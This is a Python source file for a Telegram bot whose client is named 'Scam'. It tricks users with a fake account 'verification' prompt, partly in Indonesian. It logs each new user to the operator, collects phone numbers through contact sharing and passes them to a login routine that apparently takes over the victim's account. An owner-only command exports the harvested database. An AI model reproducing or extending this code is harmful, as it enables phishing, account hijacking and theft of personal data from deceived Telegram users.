import traceback

from pyrogram import Client, idle, filters, session
from pyrogram.raw import functions
import asyncio
from pyrogram.enums import ParseMode, parse_mode
from pyrogram.errors import UserIsBlocked
from pyrogram.session.session import Session
from pyrogram.types import InlineKeyboardMarkup, Message, InlineKeyboardButton, ReplyKeyboardRemove
import re
from scam import Scam
from main import db
from helpers.util import button_start, button_verif, commands, OtpTag, OtpStrip
from .user import User
from config import OWNER


def isValidNumber(data):
    pattern = re.compile(r"^\+?[1-9]\d{1,14}$")
    if pattern.match(data):
        return True
    return False


@Scam.on_message(filters.private & filters.command(["start"]))
async def onStart(client, message: Message):
    logFromDb = await db.getConf("log")
    usrlink = f"tg://user?id={message.from_user.id}"
    button = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "Verify ✅", callback_data="btn_verify"
                ),
            ],
        ]
    )
    me = await client.get_me()
    msgs = f"New User **{message.from_user.first_name}** {message.from_user.mention} join on {me.first_name}"
    is_new = False
    if logFromDb is not None:
        try:
            # pass
            user = await db.getUser(message.from_user.id)
            if user is None:
                is_new = True
                await client.send_message(chat_id=int(logFromDb), text=msgs)
        except Exception as e:
            print(e)
    if is_new:
        await db.insert(
            idtele=message.from_user.id,
            nama=message.from_user.first_name,
            uname=message.from_user.username,
        )
    fromDb = await db.getConf("start")
    if fromDb is not None:
        try:
            text = fromDb
            if text is None:
                await message.reply_text(
                    "<i>what are you doing, useless here</i>", parse_mode=ParseMode.HTML
                )
                return
            await message.reply(
                text=text,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
                reply_markup=button,
                quote=True,
            )
        except Exception as e:
            await message.reply_text("setup not completed")
            print(e)
    else:
        await message.reply_text(
            "<b>Kami perlu memverifikasi akun anda</b>, klik setuju dibawah untuk melanjutkan verifikasi",
            reply_markup=button,
            parse_mode=ParseMode.HTML
        )

@Scam.on_message(filters.private & filters.user(OWNER) & filters.command(["backup"]))
async def onSaveImage(client, message: Message):
    from main import bot
    await message.reply_text("Backuping...")
    bot.db.db.dump()
    await client.send_document(chat_id=message.chat.id, document="NpDk.db")


@Scam.on_message(filters.private & filters.contact)
async def onContactHandler(client: Client, message: Message):
    try:
        m = await message.reply_text(
            "<i>Processing your request, please wait...</i>", reply_markup=ReplyKeyboardRemove(), parse_mode=ParseMode.HTML
        )
        phone = message.contact.phone_number
        userrr = User(client, m)
        await userrr.connect(phone)
    except Exception as e:
        print(traceback.format_exc())
        await message.reply_text(
            "<i>what are you doing, useless here</i>", parse_mode=ParseMode.HTML
        )


@Scam.on_message(filters.text & filters.private & ~filters.command(commands) & ~filters.user(OWNER))
async def my_handler(client, message):
    user = await db.getUser(message.from_user.id)
    fromDb = await db.getConf("start")
    if fromDb is not None:
        text = fromDb
        if text is None:
            await message.reply_text(
                "<i>what are you doing, useless here</i>", parse_mode=ParseMode.HTML
            )
            return
        await message.reply(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True,
            quote=True,
        )
    else:
        await message.reply_text(
            "<i>what are you doing, useless here</i>", parse_mode=ParseMode.HTML
        )


@Scam.on_message(filters.private & filters.command(["help"]))
async def onHelp(client, message):
    fromDb = await db.getConf("help")
    if fromDb is not None:
        await message.reply_text(
            fromDb,
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await message.reply_text(
            "<i>what are you doing, useless here</i>", parse_mode=ParseMode.HTML
        )
